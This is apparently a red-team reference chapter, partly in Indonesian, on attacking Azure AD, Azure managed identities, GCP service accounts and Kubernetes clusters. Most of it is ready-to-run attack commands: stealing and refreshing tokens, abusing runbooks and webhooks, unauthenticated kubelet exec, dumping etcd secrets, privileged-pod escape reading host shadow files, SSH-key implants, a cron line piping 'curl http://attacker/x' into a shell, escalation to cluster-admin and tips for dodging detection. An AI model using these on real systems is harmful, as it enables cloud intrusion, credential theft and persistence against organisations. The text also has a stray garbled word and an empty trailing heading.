# azure-gcp-k8s — cloud

# Reference Chapter: Cloud & Container Red Team

## 1. Azure AD Enumeration (ROADtools)

### 1.1 Toolchain & Versi
| Tool | Versi uji | Fungsi |
|---|---|---|
| `roadrecon` | 0.4.x (Python 3.11) | Dump & query Azure AD |
| `roadtx` | 0.3.x | Token acquisition (device code, PRT, FOCI) |
| `AADInternals` | 0.9.x (PS 7.4) | Post-dump object manipulation |
| `TokenTacticsV2` | current | FOCI refresh chain |

### 1.2 Authenticated Dump (user creds + MFA)
```bash
roadrecon auth -u user@tenant.onmicrosoft.com -p 'Password!'
# Muncul: device code prompt, browser auth, JWT cached di %USERPROFILE%\.roadtools\
roadrecon gather
# Output: roadrecon.db (SQLite) — Table: Users, Groups, Applications, ServicePrincipals, RoleAssignments
roadrecon gui   # http://127.0.0.1:5000
```
**What is sent:** OAuth2 request to `https://login.microsoftonline.com/common/oauth2/v2.0/token` + Graph `/v1.0/*`.
**What appears:** `access_token` for Graph (aud=`https://graph.microsoft.com`), `refresh_token` (~90d), PRT if device-join.
**Why it works:** default consent for scope `User.Read`, `Directory.Read.All` is often granted tenant-wide. Fails if `Security Defaults`/CAP blocks legacy auth or `Directory.Read.All` is revoked on the default role.

### 1.3 Token without Password (FOCI / device code)
```bash
roadtx devicecode --client microsoft.office.core --resource msgraph
# Muncul: user_code + verification_uri, poll sampai sukses
roadtx refreshtokens -r <refresh_token> --client microsoft.azure.authenticator
# Tukar token Office -> Azure CLI -> Teams -> Graph via FOCI family
```
Common FOCI families: `microsoft.office.core`, `microsoft.azure.authenticator`, `1950a258-227b-4e31-a9cf-717495945fc2` (Azure PowerShell), `04b07795-8ddb-461a-bbee-02f9e1bf7b46` (Azure CLI).
**Why it works:** token refresh across clients within one family — different aud, same `refresh_token`. Fails if `foci` is disabled via CA or `Token Protection` is active (Win 11 24H2 + Entra ID P1).

### 1.4 Quick Enum Query (SQLite)
```sql
-- Global admins
SELECT u.displayName, u.userPrincipalName FROM Users u
JOIN DirectoryRoles dr ON 1=1
JOIN RoleAssignments ra ON ra.roleObjectId = dr.objectId
WHERE dr.displayName='Global Administrator';
-- Apps dengan consent user
SELECT appDisplayName, scope FROM ServicePrincipalConsents WHERE consentType='AllPrincipals';
```
Buka `roadrecon.db` via `sqlite3 roadrecon.db`.

### 1.5 Roadtx PRT (device-join Windows 11 24H2)
```bash
roadtx prtenrich -r <prt_cookie> --prt-sessionkey <key>
roadtx prtauth -r <prt> --client microsoft.azure.authenticator --resource msgraph
```
PRT is retrieved via `dsregcmd /status` (must be SYSTEM or user context) → `AzureAdPrt: YES`.

---

## 2. Managed Identity Abuse (Azure)

### 2.1 Identification from inside VM/Container
```bash
# IMDS Azure — hanya dari resource dengan MSI enabled
curl -s -H Metadata:true --noproxy '*' \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Muncul: { "access_token": "eyJ...", "client_id":"...", "expires_in":"86399" }
```
**Version note:** `api-version=2018-02-01` is still accepted as of 2024; `2019-08-01` adds optional `client_id` for user-assigned.

### 2.2 Enumeration from Token
```bash
ACCESS=<token>
# Siapa aku?
curl -s -H "Authorization: Bearer $ACCESS" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
# Role assignments pada scope saat ini
curl -s -H "Authorization: Bearer $ACCESS" \
  "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId eq '<objectId>'"
```
**Why it works:** default MI has `Reader` on its RG; often over-granted `Contributor` on the subscription for convenience. Fails if `Azure RBAC` is narrowly scoped and CA blocks MI tokens forwarded outside (audience check `xms_mirid` claim).

### 2.3 Escalation via Azure Resource
| Technique | Endpoint | Effect |
|---|---|---|
| Runbook Automation Account | `Microsoft.Automation/automationAccounts/runbooks` (published) | Eksekusi kode sebagai MI Automation |
| Webhook Automation | `.../webhooks/{name}` | Trigger without auth header, `?token=` in URL |
| Logic App HTTP trigger | `Microsoft.Logic/workflows/triggers/manual` | Sama; MI tenant bisa dipanggil lintas sub |
| Function App | `Microsoft.Web/sites/functions` | Kode panggil MI Function |
| AKS cluster `kubeletidentity` | `Microsoft.ContainerService/managedClusters` | MI for kubelet, ACR access |

### 2.4 Runbook Abuse (Automation Accountковая)
```bash
# 1. List runbooks — perlu Microsoft.Automation/automationAccounts/runbooks/read
curl -s -H "Authorization: Bearer $ACCESS" \
 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Automation/automationAccounts/$AA/runbooks?api-version=2023-11-01"

# 2. Publish + start runbook dengan parameter (kalau sudah ada runbook yang echo param)
curl -s -X PUT -H "Authorization: Bearer $ACCESS" -H "Content-Type: application/json" \
 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Automation/automationAccounts/$AA/runbooks/$RB/draft/publish?api-version=2023-11-01"

curl -s -X PUT -H "Authorization: Bearer $ACCESS" -H "Content-Type: application/json" \
 -d '{"properties":{"runOn":"","parameters":{"x":"id"}}}' \
 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Automation/automationAccounts/$AA/jobs/$JOB?api-version=2023-11-01"
```
**What is sent:** PUT job JSON; **what appears:** `jobId`, `status: Running`. Job output at `.../jobs/$JOB/output?api-version=2023-11-01`.
**Why it works:** Automation account often has `Contributor` on the subscription for provisioning; that MI account is inherited by the runbook. **Fails if:** runbook is based on hybrid worker (not Azure sandbox) → executes on-prem, no cloud MI; or `Automation Account` is deployed with `Identity: None`.

### 2.5 Webhook Trigger
```bash
# Ambil URL webhook (sensitive — muncul plain bila caller punya read pada webhook)
curl -s -H "Authorization: Bearer $ACCESS" \
 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Automation/automationAccounts/$AA/webhooks?api-version=2023-11-01"
# POST tanpa Auth header
curl -s -X POST "https://<region>.webhook.azure-automation.net/webhooks?token=<token>" \
 -H "Content-Type: application/json" -d '{"param":"x"}'
```
**Why it works:** webhook is a bearer-URL — anyone with the URL runs the runbook as MI. **Fails if:** expired (default 1 year), or runbook accepts bound params for a specific `RunAs`.

---

## 3. GCP Metadata & Service Account Impersonation

### 3.1 Metadata Server
```bash
# Token SA default dari GCE/GKE/GCF/GCR
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# {"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}

# Identitas instance
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# SSH keys di project metadata
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Kubelet / GKE: cek workload identity
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-name"
```
**Why it works:** metadata server cannot be reached from outside 169.254.169.254; inside a workload with `metadata concealment` off (GKE default pre-1.29 unless enabled) → default SA directly accessible.
**Fails if:** GKE Workload Identity enabled → `default` SA only has `roles/container.defaultNodeServiceAccount`; `--metadata=disable-legacy-endpoints=true` (default since 2021) forces `Metadata-Flavor` header.

### 3.2 SA Impersonation Chain
```bash
# Siapa aku (nanti pass ke gcloud auth)
gcloud auth activate-service-account --key-file=sa.json
gcloud config list
# Token exchange
curl -X POST "https://oauth2.googleapis.com/token" \
 -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
 -d "assertion=$(gcloud auth print-identity-token)"
```
**IAM role required:** `roles/iam.serviceAccountTokenCreator` on the target SA.
```bash
gcloud iam service-accounts get-iam-policy target@proj.iam.gserviceaccount.com
# Members: user:me@x.com   role: roles/iam.serviceAccountTokenCreator

# Impersonate
gcloud auth print-access-token --impersonate-service-account=target@proj.iam.gserviceaccount.com
# Atau langsung via API
curl -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
 "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/target@proj.iam.gserviceaccount.com:generateAccessToken" \
 -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'
```
**Why it works:** `iam.serviceAccounts.actAs` (for resource deploy) and `iam.serviceAccounts.getAccessToken` (for direct token) are often granted broadly via `roles/editor` in the project — Editor does **not** have getAccessToken (since 2022) but has `actAs`. Project `owner` will definitely succeed.
**Fails if:** `iam.serviceAccounts.getAccessToken` is revoked from Editor via org policy; or `Workload Identity Federation` blocks user-SA binding across projects.

### 3.3 Metadata Flag Abuse (GKE)
```bash
# Dari dalam pod GKE
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://container.googleapis.com/&format=full"
# -> JWT dengan aud container API — dipakai untuk call GKE API bila node SA punya role
```
**Why it works:** default audience `kubernetes.io` or `container.googleapis.com` is preserved for node SA. If node SA is given `roles/container.clusterViewer` → cluster-info leaks.

---

## 4. Kubernetes

### 4.1 Anonymous API (v1.20+ `--anonymous-auth=true` default historical)
```bash
# Cek anon access ke API server
curl -k https://<apiserver>:6443/api
curl -k https://<apiserver>:6443/api/v1/namespaces
curl -k https://<apiserver>:6443/version
```
**What is sent:** GET without `Authorization`. **What appears:** `{"kind":"APIVersions",...}` if anon is allowed (legacy kubelet, kubeadm <1.22 without strict RBAC, managed cluster should not).
Version: since K8s 1.22 `--anonymous-auth` is no longer default `true` in kubelet; API server increasingly often `--anonymous-auth=false` + `system:anonymous` is bound to `system:discovery` only.
**Fails if:** `RBAC` bind `system:unauthenticated` is removed (default managed: AKS/GKE/EKS returns 401).

### 4.2 Kubelet 10250 Exec
```bash
# Cek
curl -k https://<node-ip>:10250/pods
# Unauthenticated exec (kubelet --anonymous-auth=true legacy / --authorization-mode=AlwaysAllow)
curl -k -X POST "https://<node-ip>:10250/run/<ns>/<pod>/<container>" \
 -d "cmd=id"
# {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Success"}
# session command streaming:
curl -k "https://<node-ip>:10250/exec/<ns>/<pod>/<container>?output=1&error=1&command=/bin/sh&command=-c&command=id"
```
**Why it works:** kubelet port 10250 without authz (default kubeadm pre-1.19 `AlwaysAllow`, or `--anonymous-auth=true`). **Fails if:** `--authorization-mode=Webhook` (default managed cluster) → requires bearer token or client cert with RBAC `nodes/proxy` & `pods/exec`; kubelet 10255 read-only ports are also closed since 1.23.

### 4.3 Etcd Direct
```bash
# Etcd 2379 — tanpa client cert bila --client-cert-auth=false
etcdctl --endpoints=https://<node>:2379 --insecure-skip-tls-verify \
  get / --prefix --keys-only | head
# Ambil SA token dari secrets
etcdctl --endpoints=https://<node>:2379 --insecure-skip-tls-verify get \
  /registry/secrets/kube-system/<sa-token-secret> --print-value-only | strings | grep -A1 token
```
**What appears:** protobuf → SA JWT token (base64 inside the value). Decode bypass: `strings` is enough for JWT `eyJ...`.
**Why it works:** etcd default listen `127.0.0.1:2379` since 1.10 — only exposed if kubeadm `--listen-client-urls` is changed or etcd is hosted separately with a loose firewall. **Fails if:** `--client-cert-auth=true` (default kubeadm) → requires cert `/etc/kubernetes/pki/etcd/server.crt`.

### 4.4 Token in Pod
```bash
# Default mount (pre-1.24) — automount SA token = token permanen
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# 1.24+ projected token (aud=kubernetes.default, ~1h, auto-rotate)
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export APISERVER=https://kubernetes.default.svc
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
 -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/pods
```
**Token version detection:** `kubectl version --short` on the node, or `jq -R 'split(".")[1]|@base64d|fromjson' token` → `aud` field. Projected token has `kubernetes.io` aud; legacy token aud=`null`.
**What is sent:** Bearer JWT; **what appears:** 200 with RBAC payload. **Fails if:** `automountServiceAccountToken: false`, or `BoundServiceAccountTokenVolume` (default 1.24+) rotates every 24h — a leaked token dies quickly.

### 4.5 Privileged / hostPath / hostPID Escape

#### 4.5.1 Privileged + hostPID → nsenter
```bash
# Dalam pod privileged dengan hostPID: true
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Atau tanpa nsenter:
cat /proc/1/root/etc/shadow      # host filesystem
cat /proc/1/root/etc/kubernetes/admin.conf  # kubelet admin kubeconfig bila control-plane
```
**Minimal manifest example:**
```yaml
apiVersion: v1
kind: Pod
metadata: {name: pwn}
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: c
    image: alpine:3.20
    securityContext: {privileged: true}
    command: ["sleep","infinity"]
```
**Why it works:** privileged container = all caps + host `/dev/*`. hostPID → host PID namespace is visible, `/proc/1/root` = host fs. Special type: escape to node with `/proc/1/root/etc/kubernetes/pki/*` → take `ca.key` → forge client cert `system:masters`.
**Fails if:** `PodSecurityAdmission` level `restricted`/`baseline` (default 1.25+ with label `pod-security.kubernetes.io/enforce`) rejects `privileged: true` in labeled ns; OPA Gatekeeper/Kyverno policy; AKS `--enable-policy=azure` prevents `hostPath` & privileged in certain ns.

#### 4.5.2 hostPath → host FS RW
```yaml
spec:
  containers:
  - name: c
    image: alpine
    volumeMounts: [{name: h, mountPath: /host}]
  volumes:
  - name: h
    hostPath: {path: /, type: Directory}
```
```bash
# Tulis authorized_keys ke host/node
chroot /host /bin/bash -c 'echo "ssh-ed25519 AAAA..." >> /root/.ssh/authorized_keys'
# Atau cron persistence
echo '* * * * * root curl http://attacker/x | sh' > /host/etc/cron.d/x
```
**Why it works:** hostPath is not restricted by path — `/`, `/var/lib/kubelet`, `/var/lib/docker`, `/var/log`, `/etc/kubernetes` are classic. Via `/var/lib/kubelet` you can get kubelet kubeconfig → `system:node`.
**Fails if:** admission webhook rejects `hostPath`, or kubelet `--allow-privileged=false` + `hostPath` block in managed cluster (GKE Autopilot, AKS restricting `hostPath` in certain ns).

#### 4.5.3 hostNetwork + kubelet impersonation
```yaml
spec:
  hostNetwork: true
  containers: [{name: c, image: alpine, securityContext: {privileged: true}}]
```
→ access localhost:10250 kubelet from pod, execute `curl -k https://127.0.0.1:10250/pods` with node token.

### 4.6 RBAC Escalation Paths

| Privesc | Required role | Method |
|---|---|---|
| Make admin | `create rolebindings` in namespace | bind `cluster-admin` to own SA (if `escalate`/`bind` verb on rolebinding object is owned) |
| Read all SA tokens | `get secrets` cluster-wide | `kubectl get secrets -A -o json \| jq '.items[] \| select(.type=="kubernetes.io/service-account-token")'` |
| Exec into admin pod | `pods/exec` | exec into `kube-apiserver` or `kube-controller-manager` pod → read flag `--service-account-key-file` |
| Impersonate | `impersonate` on user/group/SA | `kubectl --as=system:admin --as-group=system:masters get pods` |
| Node proxy | `nodes/proxy` | `curl -k https://<node>/api/v1/nodes/<node>/proxy/...` -> kubelet API sebagai kubelet creds |
| Escalate SA | `escalate` in ClusterRole | modify own role / bind CRB |

Chained example:
```bash
# 1. role dengan verb create rolebindings di ns
kubectl auth can-i create rolebindings -n target
# 2. CRB ke cluster-admin
kubectl create rolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:pwn -n target
# 3. token
kubectl -n target create token pwn
```
**Why it works:** `bind`/`escalate` verbs are often granted inadvertently via built-in `edit`/`admin` ClusterRole. `escalate` in ClusterRole gives the right to create/update any role above it.
**Fails if:** RoleBinding with `bind` is removed; OPA policy blocks `cluster-admin` binding; or target namespace does not allow `escalate` in new role.

### 4.7 RBAC Enumerasi Cepat
```bash
# Cek hak di semua ns
kubectl auth can-i --list -n default
# Self subject rules, rekursif
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name|test("sa|default"))'
# Role yang punya escalate/bind
kubectl get clusterroles,roles -A -o json | jq '.items[] | select(.rules[]?.verbs[]? | . == "escalate" or . == "bind")'
# Siapa bisa bikin rolebinding
kubectl auth can-i create rolebindings --as=system:serviceaccount:default:default -n kube-system
```

### 4.8 Token Theft Post-Compromise
```bash
# Rotasi manual bypass via create token (1.24+)
kubectl -n kube-system create token default --duration=87600h  # 10 tahun
```
**Note:** `create token` is still restricted by RBAC `serviceaccounts/token`, but if you have `create serviceaccounts/token` → long-lived SA token as desired.

---

## 5. Operational Pitfalls (Field-failure)

| # | Jebakan | Gejala / mitigasi |
|---|---|---|
| 1 | **Roadrecon token expiry in the middle of gather** | Graph 429/401 after ~30 minutes. Use `--refresh-interval 5` + resume via `roadrecon gather --db roadrecon.db --resume`. |
| 2 | **FOCI dead due to `Continuous Access Evaluation` (CAE)** | Token is revoked on network change / password reset. Check `xms_cc: cp1` and `evaluation` event in `entra sign-in logs`. Fast token refresh is required. |
| 3 | **Azure IMDS latency 169.254.169.254 in container** | Container `--net=none` or istio sidecar with iptables redirect → `169.254.169.254` unreachable. Check `ip route`, try `--noproxy '*'` for curl, or intercepting `http_proxy` env. |
| 4 | **MI token audience mismatch** | Token for `management.azure.com` is not valid for `graph.microsoft.com`/`vault.azure.net`. Must use different `resource=`. Log: `AADSTS50013` or `AudienceNotSupported`. |
| 5 | **Automation Runbook sandbox = `Azure` but external packages blocked** | `pwsh` runbook without `Az` module → fails to call MI. Check `job.output` — often shows `Module not found`. Use `Python 3.8` runbook or upload module first. |
| 6 | **Automation webhook expired** | Default 1 year; token in URL returns 401 once expired. `Get-AzAutomationWebhook` cannot retrieve — must reset. |
| 7 | **GCP Workload Identity blocks SA metadata** | `metadata.google.internal` returns 403 `Forbidden`. Check `kubectl get sa <ns>:<sa> -o yaml` → `iam.gke.io/gcp-service-account` annotation. Fallback requires `gcloud auth application-default`, which will not exist. |
| 8 | **`generateAccessToken` denied with `iam.serviceAccounts.getAccessToken`** | Editor/Viewer no longer have that verb (since 2022). Check `gcloud iam service-accounts get-iam-policy` per-SA, not project policy. |
| 9 | **Kubelet 10250 `Webhook` authz** — 401 `Unauthorized` | Managed cluster (AKS/GKE/EKS) uses webhook. Requires bearer token with `system:node` or exec token in pod. Port 10250 can only be reached from node's pod network / hostNetwork. |
| 10 | **Etcd 2379 unreachable from pod** | kubeadm sets `listen-client-urls=https://127.0.0.1:2379` + `client-cert-auth=true`. Requires hostNetwork + privileged + host `/etc/kubernetes/pki/etcd/*.crt` (from hostPath). |
| 11 | **PodSecurityAdmission `restricted`** (default 1.25+ with label) | `privileged: true` rejected: `violates PodSecurity "restricted:latest"`. Find ns without label (`kube-system` is often still `privileged` in managed cluster — try `kubectl -n kube-system run`). |
| 12 | **`automountServiceAccountToken: false`** | `cat token` → `No such file or directory`. Check via `kubectl get pod -o yaml` → bypass impossible; find sidecar/initContainer that still mounts it. |
| 13 | **BoundServiceAccountTokenVolume expiry** | Token 1h, aud=`kubernetes.default` — cannot be used with API server outside cluster; refresh loop requires file mount. |
| 14 | **`kubectl create token --duration` max 1 year** — not token lifetime | Default `24h`, max `87600h` in 1.30+; pre-1.24 uses `secrets` (permanent) — check `--bound-object-...` in `create token`. |
| 15 | **RBAC `escalate` missing after editing `ClusterRole`** | `system:masters` is not a role, not bound to CRB; built-in role `cluster-admin` has `escalate` — do not expect `edit` to have `bind` in CRB. Check `kubectl describe clusterrole <role>`. |
| 16 | **hostPath mount rejected in AKS/GKE Autopilot** | Error `forbidden: hostPath`. GKE Autopilot blocks entirely; AKS requires `--enable-...` / ns whitelist in the `--enable-policy` policy addon. |
| 17 | **`nsenter` fails because `hostPID` is false** | PID 1 remains the container. `/proc/1/root` = container root. Check `readlink /proc/self/ns/pid` vs `readlink /proc/1/ns/pid`. |
| 18 | **Node `system:node` credential rotation every 90 days** | Cert in `/var/lib/kubelet/pki/kubelet-client-current.pem` is rotated automatically; exfiltration requires refreshing before it expires. |
| 19 | **AKS `kubeletidentity` vs `clusterIdentity`** | VMSS MSI ≠ control plane MSI. `kubeletidentity` for ACR pull; `clusterIdentity` for load balancer & subnet. Wrong audience = 403 at `management.azure.com`. |
| 20 | **Cloud metadata header strict** | AWS `X-aws-ec2-metadata-token` (IMDSv2) vs GCP `Metadata-Flavor: Google` vs Azure `Metadata:true`. Wrong header = 400, not 200. IMDSv2 is default on new EC2 since 2024 — do not assume v1. |
| 21 | **`kubectl --as=system:admin` rejected** | Requires `impersonate` verb on `users`/`groups` — not present in default roles. `kubectl auth can-i impersonate users` for a quick check. |
| 22 | **CAE + FOCI token refresh from a different IP** | Entra ID triggers re-auth (block). Use a consistent IP or the same `--tenant` + device-bound PRT if device-joined. |
| 23 | **Logging menangkap token via Graph `/auditLogs`** | User-access token FOCI menghasilkan `signIn` log per resource. Rate limit `Throttling: 429` → backoff 30s. |
| 24 | **Token in webhook URL = often logged in Application Insights / Azure Monitor** | Webhook URI 401 after token rotation or when the `sensitive: true` param filter is active. Check `diagnostic settings` before exploitation. |
| 25 | **`curl --noproxy '*'` vs container `HTTP_PROXY`** | Proxy intercepts `169.254.169.254` → 403 from the proxy. Must use `--noproxy '*'`, or remove the `http_proxy`/`https_proxy` env and set `NO_PROXY=169.254.169.254,metadata.google.internal`. |

---

## [reasoning trace]


